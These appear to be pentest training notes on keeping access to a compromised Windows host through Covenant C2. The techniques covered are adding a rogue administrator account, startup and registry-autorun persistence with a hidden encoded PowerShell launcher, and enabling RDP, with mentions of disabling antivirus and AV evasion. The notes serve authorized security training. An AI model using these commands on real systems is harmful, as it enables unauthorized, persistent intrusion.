# Persistence

Here we assume we have a shell with administrative privileges on the target

## Create a new user

### Covenant

- Select Interact in your grunt
- Use `shellcmd net users username password /add` (Note: for a real context engagement we need to make a safe password and a recognizable username such as the name of the company we work for)
- we can check that the user has been successfully added using `shell net users`
- Now we need to add our user to the administrators group using `shell net localgroup administrators username /add`

## Startup Persistence

### Covenant

- This method will ibject a payload in the startup tasks
- In your grunt go to the tab Task in the GruntTask list choose `PersistStartup`
- You should see this in the Payload input: `powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>` replace the blah with a powershell encoded launcher and click on Task
- If we restart the target machine and login again there we should get our shell back

***Note: Windows Defender is really efficient in detecting this so you might have to try different things for AV evasion***

## Autorun Persistence

### Covenant

- Go to launcher, select `Binary Launcher` Generate one and Download it
- Go back to your high integrity grunt, go to the task tab
- In the GruntTack Select `PersistAutorun`, choose a directory in where to upload the binary
- Go to the interact tab type Upload put the Directory in the file path and select the bin file you download previously
- You can check if the bin was successfuly added to the Registry using this cmd: `GetRegistryKey HCKU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- Once you restart you should have a shell back

***Note: Windows Defender is really efficient in detecting this so you might have to try different things for AV evasion***

## Persistence with RDP

- With an initial shell on a machine with covenant
- Enable Remote Desktop in our target: in the interact tab we can type this `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
- We could then connect to the target using rdp and disabling anti-virus this way
- Disable Remote Desktop Commection: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`

## Resources

{% embed url="https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers" %} TCM security Academy -  Movement pivoting and persistence for pentesters and ethical hacker {% endembed %}
